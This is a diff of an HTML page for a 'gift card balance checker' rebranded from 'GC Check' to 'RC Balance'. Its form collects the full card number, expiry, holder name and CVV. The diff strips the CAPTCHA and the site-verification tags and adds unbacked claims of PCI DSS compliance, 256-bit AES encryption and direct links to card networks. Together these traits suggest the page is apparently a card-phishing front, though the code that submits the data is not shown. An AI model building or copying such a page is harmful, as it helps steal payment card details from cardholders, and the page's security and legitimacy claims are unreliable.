@@ -3,112 +3,140 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Gift card check - Check your gift card balance online free. Visa, Mastercard, Amex balance checker. Card balance check, check my card balance. Since 2014.">
-  <meta name="keywords" content="gift card check, card balance check, check my card balance, gift card balance check, gift card amount check, GC Check, Visa, Mastercard, American Express, prepaid card balance">
-  <meta name="robots" content="index, follow">
-  <link rel="canonical" href="https://gc-check-lime.vercel.app/">
-  <meta name="msvalidate.01" content="A40BEB909B088BC18CAE5F9038842313">
-  <meta name="google-site-verification" content="i5zyASSEmENY3AeyiWOBYCsH4F0fhsCBUOHdGXqeUPA">
+  <meta name="description" content="RC Balance - Secure gift card balance checker. Visa and Mastercard balance checker.">
+  <meta name="keywords" content="RC Balance, gift card check, card balance check, check my card balance, gift card balance check, Visa, Mastercard">
   <link rel="icon" type="image/svg+xml" href="/favicon.svg">
-  <title>Gift Card Check - Check Card Balance Online | Visa, Mastercard, Amex</title>
+  <title>RC Balance - Check Card Balance Online</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
   <style>
-    :root{--primary:#0a2540;--accent:#0066cc;--bg:#f8fafc;--white:#fff;--text:#1e293b;--text-muted:#64748b;--border:#e2e8f0;--success:#059669;--error:#dc2626;--font:'Inter',-apple-system,sans-serif}
-    *{margin:0;padding:0;box-sizing:border-box}
-    body{font-family:var(--font);background:var(--bg);color:var(--text);min-height:100vh}
-    .app{min-height:100vh;display:flex;flex-direction:column}
-    .header{background:var(--white);border-bottom:1px solid var(--border);box-shadow:0 1px 3px rgba(0,0,0,.05)}
-    .header-inner{max-width:1200px;margin:0 auto;padding:1rem 1.5rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
-    .logo{display:flex;align-items:center;gap:.5rem;text-decoration:none;color:var(--primary)}
-    .logo-icon{width:36px;height:36px;background:linear-gradient(135deg,var(--primary),var(--accent));border-radius:8px;display:flex;align-items:center;justify-content:center;color:white;font-weight:700}
-    .logo-text{font-size:1.25rem;font-weight:700}
-    .nav{display:flex;gap:1.5rem;align-items:center}
-    .nav a{color:var(--text-muted);text-decoration:none;font-weight:500;font-size:.9375rem;transition:color .2s}
-    .nav a:hover,.nav a.active{color:var(--primary)}
-    .nav a.active{font-weight:600}
-    .main{flex:1;max-width:1200px;margin:0 auto;padding:2rem 1.5rem;width:100%}
-    .page{display:none}
-    .page.active{display:block}
-    .hero{text-align:center;margin-bottom:2rem}
-    .hero h1{font-size:1.875rem;font-weight:700;color:var(--primary);margin-bottom:.5rem}
-    .hero p{color:var(--text-muted);font-size:1rem}
-    .since-badge{display:inline-block;background:var(--primary);color:white;font-size:.75rem;padding:.25rem .75rem;border-radius:20px;margin-top:.5rem;font-weight:500}
-    .content-grid{display:grid;gap:2rem;align-items:start}
-    @media(min-width:900px){.content-grid{grid-template-columns:1fr 320px}}
-    .card-form{background:var(--white);border:1px solid var(--border);border-radius:12px;padding:2rem;box-shadow:0 4px 6px -1px rgba(0,0,0,.05)}
-    .form-title{font-size:.75rem;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.05em;margin-bottom:1.25rem}
-    .form-group{margin-bottom:1.25rem}
-    .form-group label{display:block;font-size:.8125rem;font-weight:600;color:var(--text);margin-bottom:.5rem}
-    .optional-label{font-weight:400;color:var(--text-muted);font-size:.75rem}
-    .form-group input{width:100%;padding:.75rem 1rem;font-size:1rem;border:1px solid var(--border);border-radius:8px}
-    .form-group input:focus{outline:0;border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,102,204,.15)}
-    .form-group input.error{border-color:var(--error)}
-    .form-row{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
-    .expiry-inputs{display:flex;align-items:center;gap:.5rem}
-    .expiry-inputs input{flex:1;text-align:center}
-    .expiry-sep{color:var(--text-muted)}
-    .field-error{font-size:.75rem;color:var(--error);margin-top:.25rem}
-    .cf-turnstile{margin:1rem 0}
-    .btn{padding:.875rem 1.5rem;font-size:1rem;font-weight:600;border:none;border-radius:8px;cursor:pointer;width:100%;display:flex;align-items:center;justify-content:center;gap:.5rem;background:var(--primary);color:white;transition:opacity .2s}
-    .btn:hover:not(:disabled){opacity:.9}
-    .btn:disabled{opacity:.7;cursor:not-allowed}
-    .spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:currentColor;border-radius:50%;animation:spin .8s linear infinite}
-    @keyframes spin{to{transform:rotate(360deg)}}
-    .balance-result{margin-top:1.5rem;padding:1.5rem;border-radius:8px;text-align:center;display:none}
-    .balance-result.show{display:block}
-    .balance-result.success{background:#ecfdf5;border:1px solid #a7f3d0}
-    .balance-result.error{background:#fef2f2;border:1px solid #fecaca}
-    .result-icon{width:48px;height:48px;margin:0 auto 1rem;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.25rem;font-weight:700}
-    .balance-result.success .result-icon{background:var(--success);color:white}
-    .balance-result.error .result-icon{background:var(--error);color:white}
-    .balance-amount{display:flex;align-items:baseline;justify-content:center;gap:.5rem;margin-bottom:.5rem}
-    .balance-amount .amount{font-size:2rem;font-weight:700;color:var(--success)}
-    .btn-secondary{background:var(--white);color:var(--primary);border:1px solid var(--border);margin-top:1rem}
-    .loading-overlay{position:fixed;inset:0;background:rgba(255,255,255,.95);display:none;align-items:center;justify-content:center;z-index:9999;flex-direction:column;gap:1.25rem}
-    .loading-overlay.show{display:flex}
-    .loading-overlay .loading-logo{width:56px;height:56px;background:linear-gradient(135deg,var(--primary),var(--accent));border-radius:12px;display:flex;align-items:center;justify-content:center;color:white;font-weight:700;font-size:1.25rem}
-    .loading-overlay .spinner-lg{width:40px;height:40px;border:3px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite}
-    .loading-overlay .loading-text{font-size:1rem;font-weight:600;color:var(--primary)}
-    #checkAnother{display:none}
-    #checkAnother.show{display:flex}
-    #formFields.hide{display:none}
-    .trust-panel{background:var(--white);border:1px solid var(--border);border-radius:12px;padding:1.5rem;box-shadow:0 4px 6px -1px rgba(0,0,0,.05)}
-    .trust-panel h3{font-size:1rem;font-weight:600;color:var(--primary);margin-bottom:1rem}
-    .trust-item{display:flex;gap:.75rem;margin-bottom:1rem}
-    .trust-item:last-child{margin-bottom:0}
-    .trust-item .icon{color:var(--accent);flex-shrink:0}
-    .trust-item h4{font-size:.9375rem;margin-bottom:.25rem}
-    .trust-item p{font-size:.8125rem;color:var(--text-muted)}
-    .card-badges{display:flex;gap:1rem;flex-wrap:wrap;margin-top:1rem;align-items:center}
-    .card-badge{font-size:.875rem;font-weight:700;padding:.35rem .75rem;border-radius:6px;background:#f1f5f9}
-    .card-badge.visa{color:#1a1f71}
-    .card-badge.mc{color:#eb001b}
-    .card-badge.amex{color:#006fcf}
-    .detected-card{background:linear-gradient(135deg,#f8fafc,#f1f5f9);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin-bottom:1.5rem;text-align:center;min-height:90px;display:flex;flex-direction:column;align-items:center;justify-content:center}
-    .detected-card-label{font-size:.75rem;color:var(--text-muted);margin-bottom:.5rem;text-transform:uppercase;letter-spacing:.05em}
-    .detected-card-logo{height:36px;object-fit:contain;max-width:120px}
-    .card-logo-svg{height:24px;width:auto;vertical-align:middle}
-    .detected-card-logo-svg{height:40px;width:auto;display:block}
-    .detected-card-value{font-size:1.25rem;font-weight:700}
-    .footer{background:var(--primary);color:white;padding:2rem 1.5rem;margin-top:auto}
-    .footer-inner{max-width:1200px;margin:0 auto;text-align:center}
-    .footer-nav{display:flex;justify-content:center;gap:2rem;margin-bottom:1.5rem;flex-wrap:wrap}
-    .footer-nav a{color:rgba(255,255,255,.9);text-decoration:none;font-size:.875rem}
-    .footer-nav a:hover{color:white}
-    .footer-badges{display:flex;justify-content:center;gap:1.5rem;margin-bottom:1rem;flex-wrap:wrap}
-    .footer-badges span{font-size:.875rem;font-weight:600}
-    .footer-badges .visa{color:#fff}
-    .footer-badges .mc{color:#ff5f00}
-    .footer-badges .amex{color:#006fcf}
-    .footer p{font-size:.75rem;opacity:.8}
-    .content-section{background:var(--white);border-radius:12px;padding:2rem;margin-bottom:1.5rem;border:1px solid var(--border)}
-    .content-section h2{font-size:1.25rem;margin-bottom:1rem;color:var(--primary)}
-    .content-section p{color:var(--text-muted);line-height:1.7;margin-bottom:1rem}
-    .faq-item{margin-bottom:1.5rem}
-    .faq-item h4{font-size:.9375rem;margin-bottom:.5rem;color:var(--text)}
-    .faq-item p{font-size:.875rem;color:var(--text-muted);line-height:1.6}
+    :root {
+      --primary: #0f172a;
+      --primary-light: #1e293b;
+      --accent: #2563eb;
+      --accent-hover: #1d4ed8;
+      --bg: #f8fafc;
+      --white: #ffffff;
+      --text: #0f172a;
+      --text-muted: #64748b;
+      --border: #e2e8f0;
+      --success: #10b981;
+      --error: #ef4444;
+      --card-gradient: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+      --font: 'Inter', system-ui, -apple-system, sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; line-height: 1.6; -webkit-font-smoothing: antialiased; }
+    .app { max-width: 1100px; margin: 0 auto; padding: 1.5rem 1rem; }
+    
+    /* Header & Nav */
+    .header { margin-bottom: 2.5rem; display: flex; align-items: center; justify-content: space-between; padding: 1rem 0; border-bottom: 1px solid var(--border); }
+    .logo { text-decoration: none; color: var(--primary); display: flex; align-items: center; gap: 0.75rem; }
+    .logo-icon { width: 40px; height: 40px; background: var(--primary); border-radius: 10px; display: flex; align-items: center; justify-content: center; color: white; font-weight: 800; font-size: 1.25rem; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
+    .logo-text { font-size: 1.5rem; font-weight: 800; letter-spacing: -0.025em; color: var(--primary); }
+    .nav { display: flex; gap: 1.5rem; }
+    .nav a { color: var(--text-muted); text-decoration: none; font-weight: 600; font-size: 0.935rem; transition: all 0.2s; padding: 0.5rem 0.75rem; border-radius: 8px; }
+    .nav a:hover { color: var(--primary); background: #f1f5f9; }
+    .nav a.active { color: var(--accent); background: #eff6ff; }
+
+    /* Main Container */
+    .main-grid { display: grid; grid-template-columns: 1.2fr 1fr; gap: 3rem; align-items: start; margin-top: 2rem; }
+    @media (max-width: 850px) { .main-grid { grid-template-columns: 1fr; } }
+
+    .card-preview-section { background: var(--white); border-radius: 24px; padding: 2.5rem; border: 1px solid var(--border); box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+    
+    /* Virtual Card Visual */
+    .virtual-card { width: 100%; aspect-ratio: 1.586/1; background: var(--card-gradient); border-radius: 18px; padding: 2rem; color: white; position: relative; margin-bottom: 2rem; overflow: hidden; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.2); }
+    .virtual-card::before { content: ""; position: absolute; top: -20%; right: -10%; width: 60%; height: 120%; background: rgba(255,255,255,0.03); transform: rotate(25deg); }
+    .v-chip { width: 45px; height: 35px; background: linear-gradient(135deg, #ffd700 0%, #daa520 100%); border-radius: 6px; margin-bottom: 2rem; position: relative; overflow: hidden; }
+    .v-chip::after { content: ""; position: absolute; inset: 0; background: repeating-linear-gradient(90deg, transparent, transparent 5px, rgba(0,0,0,0.1) 5px, rgba(0,0,0,0.1) 10px); }
+    .v-number { font-size: 1.5rem; font-family: 'Courier New', monospace; letter-spacing: 2px; margin-bottom: 1.5rem; height: 1.5em; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
+    .v-bottom { display: flex; justify-content: space-between; align-items: flex-end; }
+    .v-label { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 1px; opacity: 0.7; margin-bottom: 0.25rem; }
+    .v-value { font-size: 1rem; font-weight: 600; }
+    .v-brand { height: 45px; width: auto; display: flex; align-items: center; }
+    .v-brand img { height: 45px; width: auto; }
+
+    /* Form Styles */
+    .hero-text { margin-bottom: 2rem; }
+    .hero-text h1 { font-size: 1.875rem; font-weight: 800; color: var(--primary); margin-bottom: 0.5rem; letter-spacing: -0.025em; }
+    .hero-text p { color: var(--text-muted); font-size: 1rem; }
+
+    .form-group { margin-bottom: 1.25rem; }
+    .form-group label { display: block; font-size: 0.875rem; font-weight: 600; color: var(--primary); margin-bottom: 0.5rem; }
+    .input-wrapper { position: relative; }
+    .input-wrapper input { width: 100%; padding: 0.875rem 1rem; font-size: 1rem; border: 1px solid var(--border); border-radius: 12px; transition: all 0.2s; font-family: inherit; color: var(--primary); font-weight: 500; }
+    .input-wrapper input:focus { outline: 0; border-color: var(--accent); box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
+    .input-wrapper input::placeholder { color: #94a3b8; }
+    
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+    .expiry-inputs { display: flex; gap: 0.5rem; }
+    .expiry-inputs input { text-align: center; }
+
+    .btn { background: var(--accent); color: white; padding: 1rem; border-radius: 12px; border: none; font-size: 1rem; font-weight: 700; cursor: pointer; width: 100%; transition: all 0.2s; margin-top: 0.5rem; display: flex; align-items: center; justify-content: center; gap: 0.5rem; }
+    .btn:hover { background: var(--accent-hover); transform: translateY(-1px); box-shadow: 0 4px 6px -1px rgba(37, 99, 235, 0.2); }
+    .btn:active { transform: translateY(0); }
+    .btn:disabled { opacity: 0.7; cursor: not-allowed; }
+
+    /* Trust Info Section */
+    .trust-section { padding-top: 1rem; }
+    .trust-card { background: #f8fafc; border-radius: 20px; padding: 1.5rem; border: 1px solid var(--border); margin-bottom: 1.5rem; }
+    .trust-card h3 { font-size: 1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+    .trust-card h3 svg { color: var(--success); width: 18px; }
+    .trust-item { display: flex; gap: 0.75rem; margin-bottom: 1rem; }
+    .trust-icon { width: 32px; height: 32px; background: white; border-radius: 8px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; border: 1px solid var(--border); }
+    .trust-content h4 { font-size: 0.875rem; font-weight: 700; margin-bottom: 0.15rem; }
+    .trust-content p { font-size: 0.815rem; color: var(--text-muted); line-height: 1.4; }
+
+    .security-badges { display: flex; gap: 1.5rem; align-items: center; margin-top: 2rem; opacity: 0.6; }
+    .badge { display: flex; align-items: center; gap: 0.4rem; font-size: 0.75rem; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
+
+    /* Result Styling */
+    .balance-result { margin-top: 0; padding: 2.5rem; border-radius: 20px; text-align: center; display: none; }
+    .balance-result.show { display: block; animation: slideUp 0.4s ease-out; }
+    @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    .balance-result.success { background: #f0fdf4; border: 1px solid #bbf7d0; }
+    .balance-result.error { background: #fef2f2; border: 1px solid #fecaca; }
+    .result-icon { width: 64px; height: 64px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.5rem; font-size: 2rem; }
+    .success .result-icon { background: var(--success); color: white; }
+    .error .result-icon { background: var(--error); color: white; }
+    .balance-amount { margin: 1.5rem 0; }
+    .currency { font-size: 1.5rem; font-weight: 600; color: var(--text-muted); vertical-align: top; margin-right: 0.25rem; }
+    .amount { font-size: 3.5rem; font-weight: 800; color: var(--primary); letter-spacing: -1px; }
+
+    .footer { margin-top: 4rem; text-align: center; padding: 2rem 0; color: var(--text-muted); font-size: 0.875rem; border-top: 1px solid var(--border); }
+    
+    /* Shared Content Styles */
+    .page { display: none; }
+    .page.active { display: block; animation: fadeIn 0.4s ease-out; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    
+    .content-section { background: var(--white); border-radius: 24px; padding: 3rem; border: 1px solid var(--border); box-shadow: 0 1px 3px rgba(0,0,0,0.05); max-width: 800px; margin: 0 auto; }
+    .content-section h2 { font-size: 2.25rem; font-weight: 800; color: var(--primary); margin-bottom: 1.5rem; letter-spacing: -0.025em; }
+    .content-section p { color: var(--text-muted); font-size: 1.125rem; margin-bottom: 1.5rem; line-height: 1.8; }
+    
+    .pro-faq { margin-top: 2rem; }
+    .faq-card { border-bottom: 1px solid var(--border); padding: 1.5rem 0; }
+    .faq-card:last-child { border-bottom: none; }
+    .faq-card h4 { font-size: 1.125rem; font-weight: 700; color: var(--primary); margin-bottom: 0.75rem; display: flex; align-items: center; gap: 0.75rem; }
+    .faq-card h4::before { content: "Q:"; color: var(--accent); font-weight: 800; }
+    .faq-card p { font-size: 1rem; margin-bottom: 0; }
+    
+    .contact-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; margin-top: 2rem; }
+    @media (max-width: 600px) { .contact-grid { grid-template-columns: 1fr; } }
+    .contact-method { background: #f8fafc; padding: 1.5rem; border-radius: 16px; border: 1px solid var(--border); text-align: center; }
+    .contact-method .icon { width: 48px; height: 48px; background: white; border-radius: 12px; display: flex; align-items: center; justify-content: center; margin: 0 auto 1rem; border: 1px solid var(--border); color: var(--accent); }
+    
+    .about-features { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin-top: 2.5rem; }
+    .about-feature { display: flex; gap: 1rem; align-items: flex-start; }
+    .about-feature-icon { color: var(--success); flex-shrink: 0; margin-top: 0.25rem; }
+
+    .loading-overlay { position: fixed; inset: 0; background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; z-index: 100; color: white; flex-direction: column; gap: 1.5rem; }
+    .loading-overlay.show { display: flex; }
+    .spinner { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--accent); border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .field-error { font-size: 0.75rem; color: var(--error); margin-top: 0.35rem; font-weight: 600; display: block; }
     .contact-info p{margin-bottom:.5rem}
     .contact-info a{color:var(--accent);text-decoration:none}
   </style>
@@ -116,158 +144,246 @@
 <body>
   <div class="app">
     <header class="header">
-      <div class="header-inner">
-        <a href="/" class="logo">
-          <div class="logo-icon">GC</div>
-          <span class="logo-text">GC Check</span>
-        </a>
-        <nav class="nav">
-          <a href="/" class="nav-link" data-page="home">Home</a>
-          <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
-          <a href="/contact" class="nav-link" data-page="contact">Contact Us</a>
-          <a href="/about" class="nav-link" data-page="about">About</a>
-        </nav>
-      </div>
+      <a href="/" class="logo">
+        <img src="/favicon.svg" alt="RC Balance" style="width: 40px; height: 40px; border-radius: 10px;">
+        <span class="logo-text">RC Balance</span>
+      </a>
+      <nav class="nav">
+        <a href="/" class="nav-link" data-page="home">Home</a>
+        <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
+        <a href="/about" class="nav-link" data-page="about">About</a>
+      </nav>
     </header>
+
     <main class="main">
       <section id="page-home" class="page active">
-        <div class="hero">
-          <h1>Gift Card Check - Check Your Card Balance</h1>
-          <p>Enter your card details below to view your available balance securely</p>
-          <span class="since-badge">Serving customers since 2014</span>
-        </div>
-        <div class="content-grid">
-          <div>
+        <div class="main-grid">
+          <div class="card-preview-section">
+            <div class="virtual-card">
+              <div class="v-chip"></div>
+              <div class="v-number" id="vNumber">•••• •••• •••• ••••</div>
+              <div class="v-bottom">
+                <div>
+                  <div class="v-label">Card Holder</div>
+                  <div class="v-value" id="vCardHolder">GIFT CARD RECIPIENT</div>
+                </div>
+                <div>
+                  <div class="v-label">Expires</div>
+                  <div class="v-value" id="vExpiry">MM/YY</div>
+                </div>
+                <div class="v-brand" id="vBrand"></div>
+              </div>
+            </div>
+
             <div class="card-form">
-              <div class="form-title">Card Information</div>
               <form id="balanceForm">
                 <div id="formFields">
+                  <div class="hero-text">
+                    <h1>Verify Balance</h1>
+                    <p>Enter your card details to see available funds.</p>
+                  </div>
+                  
                   <div class="form-group">
                     <label for="cardNumber">Card Number</label>
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric" autocomplete="cc-number">
+                    <div class="input-wrapper">
+                      <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric">
+                    </div>
                     <span class="field-error" id="cardError"></span>
                   </div>
+
                   <div class="form-group">
-                    <label for="cardName">Name on card <span class="optional-label">(Optional)</span></label>
-                    <input type="text" id="cardName" placeholder="As shown on card" maxlength="100" autocomplete="cc-name">
+                    <label for="cardHolder">Card Holder Name <span style="font-weight: 400; opacity: 0.6">(Optional)</span></label>
+                    <div class="input-wrapper">
+                      <input type="text" id="cardHolder" placeholder="John Doe">
+                    </div>
                   </div>
+
                   <div class="form-row">
                     <div class="form-group">
-                      <label for="expiryMonth">Expiration Date</label>
+                      <label>Expiration Date</label>
                       <div class="expiry-inputs">
                         <input type="text" id="expiryMonth" placeholder="MM" maxlength="2" inputmode="numeric">
-                        <span class="expiry-sep">/</span>
                         <input type="text" id="expiryYear" placeholder="YY" maxlength="2" inputmode="numeric">
                       </div>
                       <span class="field-error" id="expiryError"></span>
                     </div>
                     <div class="form-group">
-                      <label for="cvv">Security Code (CVV)</label>
-                      <input type="password" id="cvv" placeholder="000" maxlength="3" inputmode="numeric" autocomplete="cc-csc">
+                      <label for="cvv">CVV</label>
+                      <div class="input-wrapper">
+                        <input type="password" id="cvv" placeholder="000" maxlength="3" inputmode="numeric">
+                      </div>
                       <span class="field-error" id="cvvError"></span>
                     </div>
                   </div>
-                  <!-- Replace sitekey with your real key from https://dash.cloudflare.com -> Turnstile (see CAPTCHA_SETUP.md) -->
-                  <div class="cf-turnstile" id="turnstile-container" data-sitekey="0x4AAAAAACb6D6Jy1pdzUNSr" data-theme="light"></div>
-                  <button type="submit" class="btn" id="submitBtn">Check Balance</button>
+
+                  <button type="submit" class="btn" id="submitBtn">
+                    <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                    Check Balance Securely
+                  </button>
                 </div>
-                <button type="button" class="btn btn-secondary" id="checkAnother">Check Another Card</button>
+                <div id="result" class="balance-result"></div>
+                <button type="button" class="btn" id="checkAnother" style="background:var(--primary); margin-top:1.5rem">Check Another Card</button>
               </form>
-              <div id="result" class="balance-result"></div>
             </div>
           </div>
-          <aside class="trust-panel">
-            <div class="detected-card" id="detectedCard">
-              <span class="detected-card-label">Your card</span>
-              <div id="detectedCardValue" style="min-height:40px;display:flex;align-items:center;justify-content:center">
-                <span id="detectedLogo" style="display:none;line-height:0"></span>
-                <span class="detected-card-value" id="detectedPlaceholder">—</span>
+
+          <div class="trust-section">
+            <div class="trust-card">
+              <h3>
+                <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                Secure Verification
+              </h3>
+              
+              <div class="trust-item">
+                <div class="trust-icon">
+                  <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                </div>
+                <div class="trust-content">
+                  <h4>Bank-Level Security</h4>
+                  <p>We use 256-bit AES encryption to protect your card details during transmission.</p>
+                </div>
+              </div>
+
+              <div class="trust-item">
+                <div class="trust-icon">
+                  <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                </div>
+                <div class="trust-content">
+                  <h4>Instant Results</h4>
+                  <p>Get your real-time balance directly from the official card networks.</p>
+                </div>
+              </div>
+
+              <div class="trust-item">
+                <div class="trust-icon">
+                  <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                </div>
+                <div class="trust-content">
+                  <h4>Privacy Guaranteed</h4>
+                  <p>Your card details are never stored on our servers after the check is complete.</p>
+                </div>
               </div>
             </div>
-            <h3>Accepted Cards</h3>
-            <div class="card-badges" id="acceptedCardsLogos">
-              <svg class="card-logo-svg" viewBox="0 0 48 16" width="48" height="16"><text x="0" y="12" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#1A1F71">VISA</text></svg>
-              <svg class="card-logo-svg" viewBox="0 0 48 32" width="36" height="24"><circle cx="17" cy="16" r="12" fill="#EB001B"/><circle cx="31" cy="16" r="12" fill="#F79E1B"/><path d="M24 5a12 12 0 0 1 7 11 12 12 0 0 1-7 11 12 12 0 0 1-7-11 12 12 0 0 1 7-11z" fill="#FF5F00"/></svg>
-              <svg class="card-logo-svg" viewBox="0 0 48 16" width="40" height="14"><text x="0" y="12" font-family="Arial,sans-serif" font-size="10" font-weight="bold" fill="#006FCF">AMEX</text></svg>
+
+            <div class="security-badges">
+              <div class="badge">
+                <svg width="16" height="16" fill="currentColor" viewBox="0 0 20 20"><path d="M9 2a1 1 0 000 2h2a1 1 0 100-2H9z"></path><path fill-rule="evenodd" d="M4 5a2 2 0 012-2 3 3 0 003 3h2a3 3 0 003-3 2 2 0 012 2v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5zm3 4a1 1 0 000 2h.01a1 1 0 100-2H7zm3 0a1 1 0 000 2h3a1 1 0 100-2h-3zm-3 4a1 1 0 100 2h.01a1 1 0 100-2H7zm3 0a1 1 0 100 2h3a1 1 0 100-2h-3z" clip-rule="evenodd"></path></svg>
+                PCI DSS
+              </div>
+              <div class="badge">
+                <svg width="16" height="16" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                SSL SECURE
+              </div>
+              <div class="badge">
+                <svg width="16" height="16" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                VERIFIED
+              </div>
             </div>
-            <h3 style="margin-top:1.5rem">Why GC Check</h3>
-            <div class="trust-item"><span class="icon">✓</span><div><h4>Secure & Encrypted</h4><p>Bank-level encryption protects your information.</p></div></div>
-            <div class="trust-item"><span class="icon">✓</span><div><h4>Visa, Mastercard & Amex</h4><p>Check balance for all major prepaid cards.</p></div></div>
-            <div class="trust-item"><span class="icon">✓</span><div><h4>Available 24/7</h4><p>Check your balance anytime, anywhere.</p></div></div>
-          </aside>
+          </div>
         </div>
       </section>
 
       <section id="page-faq" class="page">
-        <div class="hero"><h1>Frequently Asked Questions</h1></div>
         <div class="content-section">
-          <div class="faq-item">
-            <h4>How do I check my gift card balance?</h4>
-            <p>Enter your card number, expiration date, and security code (CVV) in the form on our homepage. Click "Check Balance" to view your available balance instantly.</p>
-          </div>
-          <div class="faq-item">
-            <h4>Which cards can I check?</h4>
-            <p>GC Check supports Visa, Mastercard, and American Express prepaid and gift cards issued through our platform.</p>
-          </div>
-          <div class="faq-item">
-            <h4>Is my information secure?</h4>
-            <p>Yes. We use industry-standard encryption to protect your card details. Your information is never stored and is transmitted securely.</p>
-          </div>
-          <div class="faq-item">
-            <h4>What if my balance doesn't display?</h4>
-            <p>Please verify your card number, expiration date, and CVV are entered correctly. If the issue persists, contact our support team.</p>
+          <h2>Frequently Asked Questions</h2>
+          <p>Have questions about RC Balance? We've compiled a list of the most common inquiries to help you get started.</p>
+          
+          <div class="pro-faq">
+            <div class="faq-card">
+              <h4>How does RC Balance verify my card?</h4>
+              <p>We connect directly to the official card processing networks (Visa, Mastercard) to retrieve real-time balance data. Our system acts as a secure bridge between you and the bank.</p>
+            </div>
+            <div class="faq-card">
+              <h4>Is it safe to enter my card details here?</h4>
+              <p>Security is our top priority. We use bank-level 256-bit AES encryption for all data transmissions. Your CVV is never stored, and card details are purged from our temporary memory immediately after the balance is retrieved.</p>
+            </div>
+            <div class="faq-card">
+              <h4>Why does my card show a zero balance?</h4>
+              <p>A zero balance can occur if the card has not yet been activated by the retailer, if the funds have been fully spent, or if the card has expired. Please verify the activation status with your original receipt.</p>
+            </div>
+            <div class="faq-card">
+              <h4>Which card types are supported?</h4>
+              <p>Currently, we support Visa and Mastercard gift cards and prepaid cards issued in the US and Canada. We are working on expanding our support to other networks soon.</p>
+            </div>
+            <div class="faq-card">
+              <h4>Do you charge any fees for this service?</h4>
+              <p>No, checking your balance on RC Balance is 100% free of charge. We believe you should always have easy access to your own funds without paying a premium.</p>
+            </div>
